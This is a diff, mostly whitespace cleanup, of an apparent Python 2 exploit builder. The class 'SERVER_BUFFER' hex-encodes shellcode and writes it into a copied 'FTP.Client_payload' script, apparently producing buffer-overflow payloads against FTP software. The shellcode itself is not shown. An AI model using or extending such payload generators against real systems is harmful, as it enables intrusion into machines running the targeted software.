@@ -11,9 +11,6 @@ from Banner import Banner
 import shutil
 import fileinput
 
-
-
-
 W='\033[0m'     
 R='\033[31m'    
 G='\033[0;32m'  
@@ -22,11 +19,8 @@ B='\033[34m'
 P= '\033[35m'   
 Y="\033[1;33m" 
 
-  
-
 class SERVER_BUFFER():
-  
-      
+        
       def __init__(self): 
              global W
              global R
@@ -206,10 +200,8 @@ class SERVER_BUFFER():
                    exit()                
       def auto_write(self): 
               
-                try:
-                
+                try:                
                   shell =shellcode.encode("hex")
-
                   shell1= "".join("\\x%s"%shell[i:i+2] for i in range(0, len(shell), 2))
                   self.shell_code= "".join('\n"%s"'%shell1[i:i+56] for i in range(0, len(shell1),56))
                   copy_format= shutil.copy("./FTP.Client_payload.txt","./FTP.Client_paylaod.py")
@@ -232,8 +224,7 @@ class SERVER_BUFFER():
 		            line = line.replace(line,line+ str(self.count) +'\n')
 		        if '_Shell_Code   = ('in line:
 		             line = line.rstrip()
-		             line = line.replace(line,line+ self.shell_code+ ')'+'\n')
-			     
+		             line = line.replace(line,line+ self.shell_code+ ')'+'\n')			     
 				
 		        print line,
 		  time.sleep(2)
@@ -244,9 +235,7 @@ class SERVER_BUFFER():
                 except KeyboardInterrupt:    
                      print   Banner                              	
                      exit()
-
-          
-             
+                       
 if __name__ == '__main__': 
   SERVER_BUFFER()
 
